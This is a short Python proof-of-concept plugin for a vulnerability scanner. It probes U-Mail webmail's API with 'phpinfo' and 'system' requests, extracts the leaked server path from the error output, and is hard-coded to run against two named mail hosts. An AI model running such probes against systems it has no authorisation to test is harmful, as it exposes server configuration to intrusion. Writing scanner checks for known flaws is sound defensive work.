#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
author: yichin
name: U-Mail information disclosure
refer: http://www.wooyun.org/bugs/wooyun-2010-070206
"""
import re

def assign(service, arg):
    if service == "umail":
        return True, arg

def audit(arg):
    url = arg + 'webmail/api/api.php?do='
    code, head, res, errcode, _ = curl.curl(url + 'phpinfo')
    if code == 200 and 'PHP Version' in res:
        code, head, res, errcode, _ = curl.curl(url + 'system')
        m = re.search('0 given in <b>([^<]+)</b> on line <b>(\d+)</b>', res)
        if code == 200 and m:
            security_info('U-Mail information disclosure: ' + url + 'phpinfo PATH:' + m.group(1))
        else:
            security_info('U-Mail information disclosure:' + url + 'phpinfo')
    else:
        return False

if __name__ == '__main__':
    from dummy import *
    audit(assign('umail', 'http://mail.workws.com/')[1])
    audit(assign('umail', 'http://mail.cc-pg.cn/')[1])
